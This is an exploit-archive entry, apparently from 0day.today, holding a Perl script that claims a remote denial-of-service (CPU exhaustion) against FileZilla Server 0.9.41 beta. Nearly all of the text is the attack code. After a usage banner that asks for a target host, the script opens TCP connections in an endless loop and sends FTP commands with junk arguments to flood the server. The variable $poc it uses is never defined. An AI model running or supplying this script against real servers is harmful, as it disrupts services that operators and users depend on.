# Exploit Title:FileZilla Server version 0.9.41 beta Remote DOS (CPU exhaustion)
# Date: July 10, 2012
# Author: coolkaveh
# [email protected]
# https://twitter.com/coolkaveh
# Vendor Homepage: http://filezilla-project.org/
# Version: 0.9.41
# Tested on: windows XP SP3
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Crappy FileZilla Server (CPU exhaustion)
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/perl -w
use IO::Socket;
$|=1;
sub usage {
    print "Crappy FTP Server Remote Denial Of Service\n";
    print "by coolkaveh\n";
	print "[email protected]\n";
    print "usage: perl Crappyftp.pl <host> \n";
}
$host=shift;
$port=shift || "21";
if(!defined($host)){
    print "Crappy FTP Server Remote Denial Of Service\n";
    print "by coolkaveh\n";
	print "[email protected]\n";
    print "usage: perl Crappyftp.pl <host> \n";
	exit(0);
}
$check_first=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
if(defined $check_first){
	print "$host -> $port is alive.\n";
	$check_first->close;
}
else{
die("$host -> $port is closed!\n");
}
@command=(
'NLST','CWD','%$^&*()[email protected]');
print "Dosing Server!\n";
while (1) {
   COMMAND_LIST: foreach $cmd (@command){
		LABEL5: $sock1=IO::Socket::INET->new(PeerAddr=>$host, PeerPort=>$port, Proto=>'tcp', Timeout=>30);
		if(defined($sock1)){
			$sock1->send("$cmd"." "."$poc\r\n", 0);
				}
		}		
}



#  0day.today [2018-02-20]  #
